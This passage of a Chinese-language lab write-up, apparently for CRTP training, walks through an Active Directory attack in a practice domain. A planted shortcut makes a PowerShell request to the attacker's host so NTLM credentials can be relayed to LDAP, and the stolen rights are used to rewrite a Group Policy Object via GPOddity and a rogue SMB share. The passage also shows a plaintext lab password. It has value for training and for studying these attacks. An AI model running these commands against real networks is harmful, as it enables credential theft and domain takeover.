class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> Microsoft.PowerShell.Core\FileSystem::\\dcorp<span class="literal">-ci</span>\ai&gt; <span class="built_in">cat</span> .\AI.log</span><br><span class="line">System Timestamp: <span class="number">2024</span><span class="literal">-12-23</span> <span class="number">11</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"></span><br><span class="line">========================================</span><br><span class="line">Entry <span class="number">1</span></span><br><span class="line">File Name: TestAppLauncher.lnk</span><br><span class="line">Execution Timestamp: <span class="number">2024</span><span class="literal">-12-23</span> <span class="number">11</span>:<span class="number">00</span>:<span class="number">01</span></span><br><span class="line"></span><br><span class="line">Execution Details:</span><br><span class="line">- Target Path: C:\Program Files\TestApp\TestApp.exe</span><br><span class="line">- Arguments Passed: <span class="literal">-run</span> <span class="literal">-config</span> settings.json</span><br><span class="line">- Working Directory: C:\AI</span><br><span class="line">- RunAs User: dcorp\devopsadmin</span><br><span class="line">- Environment Variables:</span><br><span class="line">    PATH: C:\Windows\System32;C:\Program Files\TestApp\</span><br><span class="line">    TEMP: C:\Users\AI_Sandbox_User\AppData\Local\Temp</span><br><span class="line"></span><br><span class="line">Execution Status:</span><br><span class="line">- Launch Status: Success</span><br><span class="line">- Execution Duration: <span class="number">1.245</span> seconds</span><br><span class="line">- <span class="keyword">Exit</span> Code: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">Behavior Analysis:</span><br><span class="line"><span class="number">1</span>. File Operations:</span><br><span class="line">    - Read: settings.json</span><br><span class="line">    - Created: output.log <span class="keyword">in</span> C:\AI\Logs\</span><br><span class="line">    - Deleted: temp.tmp</span><br><span class="line"><span class="number">2</span>. Network Connections:</span><br><span class="line">    - Outbound: <span class="number">192.168</span>.<span class="number">1.10</span>:<span class="number">443</span> (HTTPS)</span><br><span class="line">    - Protocol: TLS <span class="number">1.2</span></span><br><span class="line"><span class="number">3</span>. Registry Access:</span><br><span class="line">    - Accessed: HKEY_CURRENT_USER\Software\TestApp</span><br><span class="line">    - Modified: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TestApp</span><br><span class="line"><span class="number">4</span>. Processes Spawned:</span><br><span class="line">    - TestAppHelper.exe (PID: <span class="number">7892</span>)</span><br><span class="line"></span><br><span class="line">Security Analysis:</span><br><span class="line">- Suspicious Behavior: None detected</span><br><span class="line">- Warnings: Registry <span class="built_in">write</span> access detected but matches known behavior</span><br><span class="line"></span><br><span class="line">Logs Generated:</span><br><span class="line">- Execution Log Path: logs/TestAppLauncher_2024<span class="literal">-12-23_11-00-01</span>.log</span><br><span class="line">- Summary:</span><br><span class="line">    Total Operations: <span class="number">32</span></span><br><span class="line">    Errors: <span class="number">0</span></span><br><span class="line">    Warnings: <span class="number">1</span> (Registry access)</span><br><span class="line">========================================</span><br><span class="line"></span><br><span class="line">Entry <span class="number">2</span></span><br><span class="line">File Name: BackupScript.lnk</span><br><span class="line">Execution Timestamp: <span class="number">2024</span><span class="literal">-12-23</span> <span class="number">11</span>:<span class="number">02</span>:<span class="number">15</span></span><br><span class="line"></span><br><span class="line">Execution Details:</span><br><span class="line">- Target Path: C:\Scripts\BackupRunner.bat</span><br><span class="line">- Arguments Passed: /daily /logs backup.log</span><br><span class="line">- Working Directory: C:\AI</span><br><span class="line">- RunAs User: dcorp\devopsadmin</span><br><span class="line"></span><br><span class="line">Execution Status:</span><br><span class="line">- Launch Status: Failed</span><br><span class="line">- Execution Duration: <span class="number">0.183</span> seconds</span><br><span class="line">- <span class="keyword">Exit</span> Code: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">Behavior Analysis:</span><br><span class="line"><span class="number">1</span>. File Operations:</span><br><span class="line">    - Read: None</span><br><span class="line">    - Created: error.log <span class="keyword">in</span> C:\AI\Logs\</span><br><span class="line">    - Attempted Access: backup_config.json (File Not Found)</span><br><span class="line"><span class="number">2</span>. Network Connections:</span><br><span class="line">    - None detected</span><br><span class="line"><span class="number">3</span>. Registry Access:</span><br><span class="line">    - None</span><br><span class="line"><span class="number">4</span>. Processes Spawned:</span><br><span class="line">    - None</span><br><span class="line"></span><br><span class="line">Security Analysis:</span><br><span class="line">- Suspicious Behavior: None</span><br><span class="line">- Warnings: Missing configuration file backup_config.json caused execution failure</span><br><span class="line"></span><br><span class="line">Logs Generated:</span><br><span class="line">- Execution Log Path: logs/BackupScript_2024<span class="literal">-12-23_11-02-15</span>.log</span><br><span class="line">- Summary:</span><br><span class="line">    Total Operations: <span class="number">5</span></span><br><span class="line">    Errors: <span class="number">1</span> (File Not Found)</span><br><span class="line">    Warnings: <span class="number">1</span></span><br><span class="line">========================================</span><br><span class="line"></span><br><span class="line">Entry <span class="number">3</span></span><br><span class="line">File Name: MaliciousShortcut.lnk</span><br><span class="line">Execution Timestamp: <span class="number">2024</span><span class="literal">-12-23</span> <span class="number">11</span>:<span class="number">05</span>:<span class="number">45</span></span><br><span class="line"></span><br><span class="line">Execution Details:</span><br><span class="line">- Target Path: C:\Windows\System32\cmd.exe</span><br><span class="line">- Arguments Passed: /c <span class="built_in">start</span> http://malicious<span class="literal">-website</span>.com</span><br><span class="line">- Working Directory: C:\AI</span><br><span class="line">- RunAs User: dcorp\devopsadmin</span><br><span class="line"></span><br><span class="line">Execution Status:</span><br><span class="line">- Launch Status: Success</span><br><span class="line">- Execution Duration: <span class="number">0.956</span> seconds</span><br><span class="line">- <span class="keyword">Exit</span> Code: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">Behavior Analysis:</span><br><span class="line"><span class="number">1</span>. File Operations:</span><br><span class="line">    - None detected</span><br><span class="line"><span class="number">2</span>. Network Connections:</span><br><span class="line">    - Outbound: malicious<span class="literal">-website</span>.com (HTTP)</span><br><span class="line">    - Protocol: Plain HTTP</span><br><span class="line"><span class="number">3</span>. Registry Access:</span><br><span class="line">    - None</span><br><span class="line"><span class="number">4</span>. Processes Spawned:</span><br><span class="line">    - None</span><br><span class="line"></span><br><span class="line">Security Analysis:</span><br><span class="line">- Suspicious Behavior: Malicious network connection detected</span><br><span class="line">- Warnings: Targeted command attempts to access an untrusted site</span><br><span class="line"></span><br><span class="line">Logs Generated:</span><br><span class="line">- Execution Log Path: logs/MaliciousShortcut_2024<span class="literal">-12-23_11-05-45</span>.log</span><br><span class="line">- Summary:</span><br><span class="line">    Total Operations: <span class="number">3</span></span><br><span class="line">    Errors: <span class="number">0</span></span><br><span class="line">    Warnings: <span class="number">1</span> (Untrusted site access)</span><br><span class="line">========================================</span><br></pre></td></tr></table></figure>

<p>这个是他一个应用输出的日志，其中看起来他会运行<code>\\AI\</code> 目录下的 <code>lnk</code> ，而且它运行的用户是 <code>devopsadmin</code> ，正是objectrive 3里对devopsOU对应gplink的GPO有如下权限，可以直接 <code>writeOwner</code> 给权限至任意用户。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcorp\devopsadmin CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl, WriteOwner</span><br></pre></td></tr></table></figure>

<p>以及 devopsOU 的组员是 <code>dcorp-ci</code>。</p>
<p>也就是说可以利用 <code>devopsadmin</code> 控制 <code>dcorp-ci</code> 所属的 <code>devopsOU</code> 组应用的 <code>GPO</code>，然后在<code>dcorp-ci</code>上面为所欲为</p>
<p>可以用lnk钓鱼的方式拿 <code>devopsadmin</code> 凭据做 ntlmrelayx，去搞权限</p>
<p>先开监听 这里不指定 <code>--no-smb-server</code> 的话会一直报错所以要指定一下.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@dcorp<span class="literal">-std522</span>:/mnt/c/ad/tools<span class="comment"># ntlmrelayx.py  --http-port 8080 -i -t ldap://dcorp-dc.dollarcorp.moneycorp.local --no-smb-server</span></span><br><span class="line">Impacket v0.<span class="number">12.0</span> - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Protocol Client DCSYNC loaded..</span><br><span class="line">[*] Protocol Client HTTPS loaded..</span><br><span class="line">[*] Protocol Client HTTP loaded..</span><br><span class="line">[*] Protocol Client IMAPS loaded..</span><br><span class="line">[*] Protocol Client IMAP loaded..</span><br><span class="line">[*] Protocol Client LDAPS loaded..</span><br><span class="line">[*] Protocol Client LDAP loaded..</span><br><span class="line">[*] Protocol Client MSSQL loaded..</span><br><span class="line">[*] Protocol Client RPC loaded..</span><br><span class="line">[*] Protocol Client SMB loaded..</span><br><span class="line">[*] Protocol Client SMTP loaded..</span><br><span class="line">[*] Running <span class="keyword">in</span> relay mode to single host</span><br><span class="line">[*] Setting up HTTP Server on port <span class="number">8080</span></span><br><span class="line">[*] Setting up WCF Server on port <span class="number">9389</span></span><br><span class="line">[*] Multirelay disabled</span><br><span class="line"></span><br><span class="line">[*] Setting up RAW Server on port <span class="number">6666</span></span><br><span class="line">[*] Servers started, waiting <span class="keyword">for</span> connections</span><br></pre></td></tr></table></figure>

<p>新建一个lnk</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-19.png" alt="alt text"></p>
<p>带上 <code>-UseDefaultCredentials</code> 让他请求时候带上凭据</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\WindowsPowerShell\v1.<span class="number">0</span>\powershell.exe<span class="literal">-c</span>  <span class="built_in">iwr</span> <span class="number">172.16</span>.<span class="number">100.22</span>:<span class="number">8080</span> <span class="literal">-UseDefaultCredentials</span></span><br></pre></td></tr></table></figure>


<p>然后给他丢上去</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\student522\desktop&gt; mv .\powershell.exe.lnk p.lnk</span><br><span class="line">PS C:\Users\student522\desktop&gt; copy ./p.lnk \\dcorp-ci\AI\</span><br><span class="line">PS C:\Users\student522\desktop&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\student522\desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">d-----         5/21/2025  11:29 PM                shared</span><br><span class="line">d-----         5/23/2025   3:16 AM                SmbShareHunt-05232025031627</span><br><span class="line">-a----         5/22/2025  11:42 PM           2312 Microsoft Edge.lnk</span><br><span class="line">-a----         5/24/2025  12:11 AM           1854 p.lnk</span><br><span class="line">-a----         2/17/2024   4:53 AM           1322 Ubuntu.lnk</span><br><span class="line">-a----         2/15/2024   5:54 AM           1436 Windows Terminal.lnk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Users\student522\desktop&gt; dir \\dcorp-ci\AI\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: \\dcorp-ci\AI</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----          1/6/2025  12:22 AM           3332 AI.log</span><br><span class="line">-a----         5/24/2025  12:11 AM           1854 p.lnk</span><br><span class="line">-a----         5/23/2025  12:29 PM           1908 student524.lnk</span><br></pre></td></tr></table></figure>

<p>等了一会收到了ntlm请求（wsl终端有时候不刷新，需要没事按下回车）</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-20.png" alt="alt text"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">write_gpo_dacl student522 &#123;0BF8D01C-1F62-4BDC-958C-57140B67D147&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>加完之后再看 <code>0BF8D01C-1F62-4BDC-958C-57140B67D147</code> 的权限就多了当前 <code>student522</code> 的 <code>GenericAll</code> 权限了</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\student522\desktop&gt; <span class="built_in">Get-DomainObjectAcl</span> <span class="string">&quot;&#123;0BF8D01C-1F62-4BDC-958C-57140B67D147&#125;&quot;</span>|<span class="built_in">Sort-Object</span> SecurityIdentifier|?&#123;(<span class="built_in">Convert-SidToName</span> <span class="variable">$_</span>.SecurityIdentifier) <span class="operator">-match</span> <span class="string">&quot;student&quot;</span>&#125;|%&#123;<span class="string">&quot;<span class="variable">$</span>(Convert-SidToName <span class="variable">$_</span>.SecurityIdentifier) - <span class="variable">$</span>(<span class="variable">$_</span>.ActiveDirectoryRights)&quot;</span>&#125;</span><br><span class="line">dcorp\student522 - GenericAll</span><br><span class="line">dcorp\student524 - GenericAll</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-21.png" alt="alt text"></p>
<p>有了权限就可以修改的GPO，这里比较常用的有两种做法，都会演示一下</p>
<p>首先是我比较常用的 <code>sharpGPOabuse</code> 修改，要先获取一下GPO名</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-domainGPO</span></span><br><span class="line"></span><br><span class="line">flags                    : <span class="number">0</span></span><br><span class="line">displayname              : DevOps Policy</span><br><span class="line">gpcmachineextensionnames : [&#123;<span class="number">00000000</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">000000000000</span>&#125;&#123;<span class="type">CAB54552</span>-<span class="type">DEEA</span>-<span class="number">4691</span>-<span class="number">817</span><span class="type">E</span>-<span class="type">ED4A4D1AFC72</span>&#125;][&#123;<span class="number">35378</span><span class="type">EAC</span>-<span class="number">683</span><span class="type">F</span>-<span class="number">11</span><span class="type">D2</span>-<span class="type">A89A</span>-<span class="number">00</span><span class="type">C04FBBCFA2</span>&#125;&#123;<span class="type">D02B1F72</span>-<span class="number">3407</span>-<span class="number">48</span><span class="type">AE</span>-<span class="type">BA88</span>-<span class="type">E8213C6761F1</span>&#125;][&#123;<span class="number">827</span><span class="type">D319E</span>-<span class="number">6</span><span class="type">EAC</span>-<span class="number">11</span><span class="type">D2</span>-<span class="type">A4EA</span>-<span class="number">00</span><span class="type">C04F79F83A</span>&#125;&#123;<span class="number">803</span><span class="type">E14</span></span><br><span class="line">                           <span class="type">A0</span>-<span class="type">B4FB</span>-<span class="number">11</span><span class="type">D0</span>-<span class="type">A0D0</span>-<span class="number">00</span><span class="type">A0C90F574B</span>&#125;][&#123;<span class="type">AADCED64</span>-<span class="number">746</span><span class="type">C</span>-<span class="number">4633</span>-<span class="type">A97C</span>-<span class="type">D61349046527</span>&#125;&#123;<span class="type">CAB54552</span>-<span class="type">DEEA</span>-<span class="number">4691</span>-<span class="number">817</span><span class="type">E</span>-<span class="type">ED4A4D1AFC72</span>&#125;]</span><br><span class="line">whenchanged              : <span class="number">5</span>/<span class="number">24</span>/<span class="number">2025</span> <span class="number">8</span>:<span class="number">05</span>:<span class="number">36</span> AM</span><br><span class="line">versionnumber            : <span class="number">4</span></span><br><span class="line">name                     : &#123;<span class="number">0</span>BF8D01C<span class="literal">-1F62-4BDC-958C-57140B67D147</span>&#125;</span><br><span class="line">cn                       : &#123;<span class="number">0</span>BF8D01C<span class="literal">-1F62-4BDC-958C-57140B67D147</span>&#125;</span><br><span class="line">usnchanged               : <span class="number">1115909</span></span><br><span class="line">dscorepropagationdata    : &#123;<span class="number">5</span>/<span class="number">24</span>/<span class="number">2025</span> <span class="number">8</span>:<span class="number">07</span>:<span class="number">45</span> AM, <span class="number">5</span>/<span class="number">24</span>/<span class="number">2025</span> <span class="number">8</span>:<span class="number">05</span>:<span class="number">36</span> AM, <span class="number">5</span>/<span class="number">23</span>/<span class="number">2025</span> <span class="number">10</span>:<span class="number">50</span>:<span class="number">12</span> PM, <span class="number">5</span>/<span class="number">23</span>/<span class="number">2025</span> <span class="number">10</span>:<span class="number">43</span>:<span class="number">40</span> PM...&#125;</span><br><span class="line">objectguid               : fc0df125<span class="literal">-5e26-4794-93c7-e60c6eecb75f</span></span><br><span class="line">gpcfilesyspath           : \\<span class="number">172.16</span>.<span class="number">100.24</span>\stdx<span class="literal">-gp</span></span><br><span class="line">distinguishedname        : CN=&#123;<span class="number">0</span>BF8D01C<span class="literal">-1F62-4BDC-958C-57140B67D147</span>&#125;,CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local</span><br><span class="line">whencreated              : <span class="number">12</span>/<span class="number">18</span>/<span class="number">2024</span> <span class="number">7</span>:<span class="number">31</span>:<span class="number">22</span> AM</span><br><span class="line">showinadvancedviewonly   : True</span><br><span class="line">usncreated               : <span class="number">293100</span></span><br><span class="line">gpcfunctionalityversion  : <span class="number">2</span></span><br><span class="line">instancetype             : <span class="number">4</span></span><br><span class="line">objectclass              : &#123;top, container, groupPolicyContainer&#125;</span><br><span class="line">objectcategory           : CN=<span class="built_in">Group-Policy</span><span class="literal">-Container</span>,CN=Schema,CN=Configuration,DC=moneycorp,DC=local</span><br></pre></td></tr></table></figure>

<p>然后修改对应的gpo <code>DevOps Policy</code> ,添加本地管理员 </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; .\SharpGPOAbuse.exe  <span class="literal">--AddLocalAdmin</span> <span class="literal">--UserAccount</span> dcorp\student522  <span class="literal">--GPOName</span> <span class="string">&quot;DevOps Policy&quot;</span></span><br><span class="line">[+] Domain = dollarcorp.moneycorp.local</span><br><span class="line">[+] Domain Controller = dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local</span><br><span class="line">[+] Distinguished Name = CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local</span><br><span class="line">[+] SID Value of dcorp\student522 = S<span class="literal">-1-5-21-719815819-3726368948-3917688648-20682</span></span><br><span class="line">[+] GUID of <span class="string">&quot;DevOps Policy&quot;</span> is: &#123;<span class="number">0</span>BF8D01C<span class="literal">-1F62-4BDC-958C-57140B67D147</span>&#125;</span><br><span class="line">[+] File exists: \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\&#123;<span class="number">0</span>BF8D01C<span class="literal">-1F62-4BDC-958C-57140B67D147</span>&#125;\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf</span><br><span class="line">[+] The GPO does not specify any <span class="built_in">group</span> memberships.</span><br><span class="line">Access to the path <span class="string">&#x27;\\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\&#123;0BF8D01C-1F62-4BDC-958C-57140B67D147&#125;\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf&#x27;</span> is denied.[!] Exiting.</span><br></pre></td></tr></table></figure>

<p>结果这个b的运作方式是替换组策略的配置文件，所以需要 <code>dollarcorp.moneycorp.local</code> 的smb修改权限，那G</p>
<p>另一种方式则是通过修改gpo的属性来做。</p>
<p>利用 <code>gpoddity</code> 创建一个组策略脚本，他会创建恶意组策略文件，然后修改GPO的 <code>gPCFileSysPath</code> 路径指向到我们指定的恶意所在的路径。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@dcorp-std522:/mnt/c/AD/Tools/GPOddity<span class="comment"># sudo python3 gpoddity.py  --domain dollarcorp.moneycorp.local --gpo-id 0BF8D01C-1F62-4BDC-958C-57140B67D147 --username student522 --password w5b7DqgCr98B4XWP  --command &#x27;net localgroup administrators student522 /add&#x27;  --rogue-smbserver-ip 172.16.100.22 --rogue-smbserver-share &#x27;stdx-gp&#x27; --dc-ip &#x27;172.16.2.1&#x27; --smb-mode none                                                                                             </span></span><br><span class="line">=== GENERATING MALICIOUS GROUP POLICY TEMPLATE ===</span><br><span class="line"></span><br><span class="line">[*] Downloading the legitimate GPT from SYSVOL</span><br><span class="line">[+] Successfully downloaded legitimate GPO from SYSVOL to <span class="string">&#x27;GPT_out&#x27;</span> folder</span><br><span class="line">[*] Injecting malicious scheduled task into initialized GPT</span><br><span class="line">[+] Successfully injected malicious scheduled task</span><br><span class="line">[*] Initiating LDAP connection</span><br><span class="line">[+] LDAP <span class="built_in">bind</span> successful</span><br><span class="line">[*] Updating downloaded GPO version number to ensure automatic GPO application</span><br><span class="line">[+] Successfully updated downloaded GPO version number</span><br><span class="line"></span><br><span class="line">=== SPOOFING GROUP POLICY TEMPLATE LOCATION THROUGH gPCFileSysPath ===</span><br><span class="line"></span><br><span class="line">[*] Modifying the gPCFileSysPath attribute of the GPC to <span class="string">&#x27;\\172.16.100.22\stdx-gp&#x27;</span></span><br><span class="line">[+] Successfully spoofed GPC gPCFileSysPath attribute</span><br><span class="line">[*] Updating the versionNumber attribute of the GPC</span><br><span class="line">[+] Successfully updated GPC versionNumber attribute</span><br><span class="line">[*] Updating the extensionName attribute of the GPC</span><br><span class="line">[+] Successfully updated GPC extensionName attribute</span><br><span class="line"></span><br><span class="line">=== WAITING (not launching GPOddity SMB server) ===</span><br><span class="line">[*] CTRL+C to stop and clean...</span><br></pre></td></tr></table></figure>

<p>此时查看GPO <code>DevOps Policy</code> 的属性 <code>gpcfilesyspath</code> 已经被我们修改指向了我们存放生成的策略文件的smb路径。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\student522\desktop&gt; get-domainobject -Identity &quot;&#123;0BF8D01C-1F62-4BDC-958C-57140B67D147&#125;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flags                    : 0</span><br><span class="line">displayname              : DevOps Policy</span><br><span class="line">gpcmachineextensionnames : [&#123;00000000-0000-0000-0000-000000000000&#125;&#123;CAB54552-DEEA-4691-817E-ED4A4D1AFC72&#125;][&#123;35378EAC-683F-11D2-A89A-00C04FBBCFA2&#125;&#123;D02B1F72-3407-48AE-BA88-E8213C6761F1&#125;][&#123;827D319E-6EAC-11D2-A4EA-0</span><br><span class="line">                           0C04F79F83A&#125;&#123;803E14A0-B4FB-11D0-A0D0-00A0C90F574B&#125;][&#123;AADCED64-746C-4633-A97C-D61349046527&#125;&#123;CAB54552-DEEA-4691-817E-ED4A4D1AFC72&#125;]</span><br><span class="line">whenchanged              : 5/24/2025 9:02:08 AM</span><br><span class="line">versionnumber            : 5</span><br><span class="line">name                     : &#123;0BF8D01C-1F62-4BDC-958C-57140B67D147&#125;</span><br><span class="line">cn                       : &#123;0BF8D01C-1F62-4BDC-958C-57140B67D147&#125;</span><br><span class="line">usnchanged               : 1184209</span><br><span class="line">dscorepropagationdata    : &#123;5/24/2025 8:07:45 AM, 5/24/2025 8:05:36 AM, 5/23/2025 10:50:12 PM, 5/23/2025 10:43:40 PM...&#125;</span><br><span class="line">objectguid               : fc0df125-5e26-4794-93c7-e60c6eecb75f</span><br><span class="line">gpcfilesyspath           : \\172.16.100.22\stdx-gp</span><br><span class="line">distinguishedname        : CN=&#123;0BF8D01C-1F62-4BDC-958C-57140B67D147&#125;,CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local</span><br><span class="line">whencreated              : 12/18/2024 7:31:22 AM</span><br><span class="line">showinadvancedviewonly   : True</span><br><span class="line">usncreated               : 293100</span><br><span class="line">gpcfunctionalityversion  : 2</span><br><span class="line">instancetype             : 4</span><br><span class="line">objectclass              : &#123;top, container, groupPolicyContainer&#125;</span><br><span class="line">objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local</span><br></pre></td></tr></table></figure>

<p>新建一个文件夹</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /mnt/c/AD/Tools/stdx<span class="literal">-gp</span></span><br></pre></td></tr></table></figure>

<p>把生成在 <code>GPT_out</code> 下的的组策略配置复制过来</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> <span class="literal">-r</span> /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/stdx<span class="literal">-gp</span></span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-22.png" alt="alt text"></p>
<p>然后把这个文件夹share一下.</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-23.png" alt="alt text"></p>
<p>然后给一下everyone权限。</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-24.png" alt="alt text"></p>
<p>或者命令行share （需要管理员权限）,以及给一下权限</p>
